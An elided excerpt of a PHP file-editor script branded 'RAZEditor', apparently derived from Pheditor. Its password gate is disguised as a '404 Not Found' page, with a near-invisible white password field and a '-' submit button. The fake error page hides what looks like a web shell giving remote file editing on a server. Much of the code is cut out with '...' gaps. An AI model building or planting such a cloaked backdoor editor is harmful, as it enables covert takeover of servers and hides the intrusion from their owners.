...
define('PASSWORD', '824678424833aec00d2438258f4f9d6a2236ddac0257ed8ee279712190129528e9cc3c3d409e18b9a87157ea5fffbbadad31ed2186d519b99d743d587c5d4b3e');
...
if (empty(PASSWORD) === false && (isset($_SESSION['pheditor_admin']) === false || $_SESSION['pheditor_admin'] !== true)) {
	...
	die('invalid parameter go <title>404 Not Found</title><form method="post"><div style="text-align:center">' . (isset($error) ? '<p style="color:white">' . $error . '</p>' : null) . '<input style="color: white;" id="pheditor_password" name="pheditor_password" type="password" value="" placeholder="" tabindex="1"><br><br><input type="submit" value="-" tabindex="2"></div></form><script type="text/javascript">document.getElementById("pheditor_password").focus();</script>');
}
...
<body>
	...
	<div class="container-fluid">
		...
		<div class="row p-3">
			<div class="col-md-3">
				<h1><a href="http://github.com/raspiblog" target="_blank" title="RAZEditor <?= VERSION ?>">RAZEditor</a></h1>
			</div>
			<div class="col-md-9">
